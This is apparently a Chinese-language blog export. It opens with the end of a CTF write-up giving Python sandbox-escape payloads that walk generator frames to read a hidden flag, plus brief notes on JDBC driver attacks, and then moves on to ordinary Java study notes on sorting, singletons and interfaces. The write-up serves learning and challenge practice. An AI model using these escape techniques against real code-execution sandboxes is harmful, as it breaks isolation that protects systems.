class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>py栈帧逃逸</p>
<p><a class="link"   href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG==uh8kAhiD&alichlgref=https://www.cnblogs.com/" >Python利用栈帧沙箱逃逸 - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>这题的flag在沙箱的上上上帧（自己构造的两个函数两帧，exec里的一帧）</p>
<p>获取上上帧对象的三种方式</p>
<ol>
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>

<p>第一个方法不行，使用next获取栈帧对象会让结果包含LOAD_GLOBAL</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]<span class="comment">#用这&lt;listcomp&gt;需要多逃一帧</span></span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"> <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line"> pop = exp()</span><br><span class="line"> <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line"> boo=exp</span><br><span class="line"> <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br></pre></td></tr></table></figure>

<p>最后还作了个检测，就是flag不能存在output中</p>
<p>这里也有两种绕法</p>
<p>payload1:<code>print(kino.f_code.co_consts[16][1:])</code></p>
<p>截取字符串绕过，我这里用的ctfshow复现的环境，前面这个下标是16</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240524180044325.png"  alt="image-20240524180044325"></p>
<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">payload = &#x27;&#x27;&#x27;def getflag():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame=[x for x in g][0]</span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]  </span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code </span><br><span class="line">    gattr_dir = gattr.dir</span><br><span class="line">    s  = gattr.str</span><br><span class="line">    print(gattr_dir(code))</span><br><span class="line">    for i in s(code.co_consts):</span><br><span class="line">        print(i,end=&quot;,&quot;)</span><br><span class="line">getflag()&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;code&quot;: payload</span><br><span class="line">&#125;</span><br><span class="line">print(json.dumps(data))</span><br></pre></td></tr></table></figure>

<p>先用builtins获取str，然后把code.co_consts变为字符串后输出，每隔一个字符用，隔开即可</p>
<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240527172754306.png"  alt="image-20240527172754306"></p>
<p>你知道的，jdbc的攻击基本是围绕着驱动来攻击的</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527172840785.png"  alt="image-20240527172840785"></p>
<p>提供四个驱动，一个一个寻找漏洞条件</p>
<p>第一个Mysql，我知道的就反序列化漏洞，看看版本</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173431572.png"  alt="image-20240527173431572"></p>
<p>no</p>
<p>第二个PostgreSQL，控制bean.xml进行rce</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173557400.png"  alt="image-20240527173557400"></p>
<p>no</p>
<p>第三个是sqlite服务</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527203847332.png"  alt="image-20240527203847332"></p>
<p><img   src="/../img/$%7Bfiilename%7D/1f913.png"  alt="🤓书呆子脸:高清大图与Unicode信息 | EmojiAll"></p>
<p>对啦！</p>
<p>[项目文件预览 - GitCode](<a class="link"   href="https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;PostGreSQL&#x2F;index.md?utm_source&#x3D;csdn_github_accelerator&amp;isLogin&#x3D;1)</p>
<p><a class="link"   href="https://gitcode.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java" >项目文件预览 - JDBC-Attack - GitCode<i class="fas fa-external-link-alt"></i></a></p>
<p>复现太麻烦了，包括环境下载，然后还有远程debug，这些都好难弄，只按wp做了一次</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>奶奶滴临近期末，写个复现都要写几周，还有一题sanic没看，我嘞个忙</p>
<p>赛后复现赛题发现我的复现能力太差了，环境不会装，docker不会用，debug不会debug，累了</p>
<p>接下来就学学复现环境吧，从vulhub开始，然后一点一点学着调试，分析，这应该应该还算个美妙的过程</p>
<p>我在复现thinkphp的时候调试的时候就调试得我挺美的</p>
<p>期考，会赢吗？</p>
<p><img   src="/../img/$%7Bfiilename%7D/OIP-C.mG6e-yzRUBIZy6otnpkH1wAAAAw=169&h=197&c=7&r=0&o=5&dpr=1.7&pid=1.jpeg"  alt="会赢的五条悟 的图像结果"></p>
<p>还有海大你无敌了，暑假才放一个月半</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>复现</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb基础学习笔记</title>
    <url>/2024/03/19/JavaWeb%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>

<h1 id="查看变量的类型"><a href="#查看变量的类型" class="headerlink" title="查看变量的类型"></a>查看变量的类型</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查看变量类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">typeof</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o.getClass().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="冒泡排序和选择排序和快速排序的实现"><a href="#冒泡排序和选择排序和快速排序的实现" class="headerlink" title="冒泡排序和选择排序和快速排序的实现"></a>冒泡排序和选择排序和快速排序的实现</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//冒泡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Bubble</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,temp;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(a[i]&gt;a[j])&#123;</span><br><span class="line">    				temp = a[i];</span><br><span class="line">    				a[i] = a[j];</span><br><span class="line">    				a[j] = temp;</span><br><span class="line">    			&#125;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//选择</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Select</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,max,temp,x=<span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">       		max = a[i];</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(max&lt;a[j])&#123;</span><br><span class="line">    				max = a[j];</span><br><span class="line">    				x=j;</span><br><span class="line">    			&#125;</span><br><span class="line">    			temp = a[i];</span><br><span class="line">    			a[i] = a[x];</span><br><span class="line">    			a[x] = temp;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//快排</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> s,<span class="type">int</span> f)</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> f;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (s+f)/<span class="number">2</span>;</span><br><span class="line">    	<span class="type">int</span> temp;</span><br><span class="line">    	<span class="keyword">do</span>&#123;</span><br><span class="line">    		<span class="keyword">while</span>(a[j]&gt;a[mid]) j--;</span><br><span class="line">    		<span class="keyword">while</span>(a[i]&lt;a[mid]) i++;</span><br><span class="line">    		</span><br><span class="line">    		<span class="keyword">if</span>(i&lt;=j)&#123;</span><br><span class="line">    			temp = a[j];</span><br><span class="line">    			a[j] = a[i];</span><br><span class="line">    			a[i] = temp;</span><br><span class="line">    			i++;</span><br><span class="line">    			j--;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;<span class="keyword">while</span>(i&lt;=j);</span><br><span class="line">    	<span class="keyword">if</span>(i&lt;f) qsort(a,i,f);</span><br><span class="line">    	<span class="keyword">if</span>(s&lt;j) qsort(a,s,j);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="Arrays类的小应用"><a href="#Arrays类的小应用" class="headerlink" title="Arrays类的小应用"></a>Arrays类的小应用</h1><p>先把二维数组[使用System.arraycopy进行数组复制到一个一维数组<br>然后使用sort进行排序<br>最后再复制回到二维数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="comment">//Select(a);</span></span><br><span class="line">    	<span class="comment">//Bubble(a);</span></span><br><span class="line">    	<span class="type">int</span> a[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">    	<span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">9</span>];</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			a[i][j]=(<span class="type">int</span>)(Math.random()*<span class="number">100</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(a[i], <span class="number">0</span>, b, i*<span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	</span><br><span class="line">    	Arrays.sort(b);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(b, i*<span class="number">3</span>, a[i], <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			System.out.println(a[i][j]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="给方法传递一个引用数组"><a href="#给方法传递一个引用数组" class="headerlink" title="给方法传递一个引用数组"></a>给方法传递一个引用数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> j2se;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero ... heros)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;heros.length;i++)&#123;</span><br><span class="line">			System.out.println(heros[<span class="number">0</span>].name+<span class="string">&quot;攻击了&quot;</span>+heros[i].name+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">orxiain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">boogipop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">		chaospeo.name= <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">		orxiain.name = <span class="string">&quot;orxianin&quot;</span>;</span><br><span class="line">		boogipop.name = <span class="string">&quot;boogipop&quot;</span>;</span><br><span class="line">		</span><br><span class="line">		ewoji.attack(ewoji,chaospeo,orxiain,boogipop);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="饿汉式单例模式"><a href="#饿汉式单例模式" class="headerlink" title="饿汉式单例模式"></a>饿汉式单例模式</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GiantDragon</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;龙王&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">1000.0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">Armor</span> <span class="operator">=</span> <span class="number">100.0</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GiantDragon</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">GiantDragon</span> <span class="variable">one</span> <span class="operator">=</span> GiantDragon.getDragon();</span><br><span class="line">		System.out.println(one.name+one.hp+one.Armor);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的GiantDragon instance和getDragon()必修都要用static修饰</p>
<p>前者是为了在不实例化的情况下就把唯一的大龙对象实例化</p>
<p>后者是为了在不实例化的情况下直接访问这个方法</p>
<h1 id="懒汉式单例模式"><a href="#懒汉式单例模式" class="headerlink" title="懒汉式单例模式"></a>懒汉式单例模式</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> GiantDragon instance;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="literal">null</span>==instance)&#123;</span><br><span class="line">			instance = <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>和饿汉式的区别是，它不会直接加载这个实例instance，而是当你调用getDragon()的时候才会创造这个实例</p>
<h1 id="利用接口实现类的多态"><a href="#利用接口实现类的多态" class="headerlink" title="利用接口实现类的多态"></a>利用接口实现类的多态</h1><p>Motal接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Mortal</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的重写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">AP</span>,Mortal &#123;</span><br><span class="line">	<span class="comment">//法术平A</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">magicAttack</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;法术平A&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//死</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;死亡&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//杀</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">kill</span><span class="params">(Mortal m)</span>&#123;</span><br><span class="line">    	m.die();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">ADHero</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        go.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        ewoji.kill(go);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的是一个接口</p>
<h1 id="子类使用父类的带参初始化方法"><a href="#子类使用父类的带参初始化方法" class="headerlink" title="子类使用父类的带参初始化方法"></a>子类使用父类的带参初始化方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">APHero</span><span class="params">(String name,<span class="type">double</span> hp)</span>&#123;</span><br><span class="line">		<span class="built_in">super</span>(name,hp);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="重写equals比较两个对象内容是否相等"><a href="#重写equals比较两个对象内容是否相等" class="headerlink" title="重写equals比较两个对象内容是否相等"></a>重写equals比较两个对象内容是否相等</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Hero)&#123;</span><br><span class="line">            <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> (Hero) o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hp == h.hp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hero h1= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.hp = <span class="number">300</span>;</span><br><span class="line">        Hero h2= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.hp = <span class="number">400</span>;</span><br><span class="line">        Hero h3= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h3.hp = <span class="number">300</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(h1.equals(h2));</span><br><span class="line">        System.out.println(h1.equals(h3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果不重写的话，Object的只会比较两个对象的引用是否指向一个对象</p>
<h1 id="利用非静态内部类和静态内部类服务外部类"><a href="#利用非静态内部类和静态内部类服务外部类" class="headerlink" title="利用非静态内部类和静态内部类服务外部类"></a>利用非静态内部类和静态内部类服务外部类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分数类,非静态，可访问外部类变量</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BattleScore</span>&#123;</span><br><span class="line">    	<span class="type">int</span> kill;</span><br><span class="line">    	<span class="type">int</span> die;</span><br><span class="line">    	<span class="type">int</span> assit;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">legendary</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(kill &gt; <span class="number">8</span>)</span><br><span class="line">    			System.out.println(name+<span class="string">&quot;超神！&quot;</span>);</span><br><span class="line">    		<span class="keyword">else</span></span><br><span class="line">    			System.out.println(name+<span class="string">&quot;尚未超神&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//水晶类,静态,不可访问外部类变量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnemyCrystal</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">5000</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkIfVictory</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(hp==<span class="number">0</span>)&#123;</span><br><span class="line">    			Hero.battleWin();</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="转换为字符串的两种方法"><a href="#转换为字符串的两种方法" class="headerlink" title="转换为字符串的两种方法"></a>转换为字符串的两种方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//使用String类的静态方法valueOf()转化</span><br><span class="line">		int go = 222222;</span><br><span class="line">		String str = String.valueOf(go);</span><br><span class="line"></span><br><span class="line">		//使用Obeject类的方法toString()转化</span><br><span class="line">		Integer it = go;</span><br><span class="line">		String go1 = it.toString();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb中级学习笔记</title>
    <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>

<h1 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h)</span> <span class="keyword">throws</span> EnemyDeadException&#123;</span><br><span class="line">        <span class="keyword">if</span>(h.hp == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EnemyDeadException</span>(h.name+<span class="string">&quot;已经死了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//击杀异常</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnemyDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">        chaospeo.name = <span 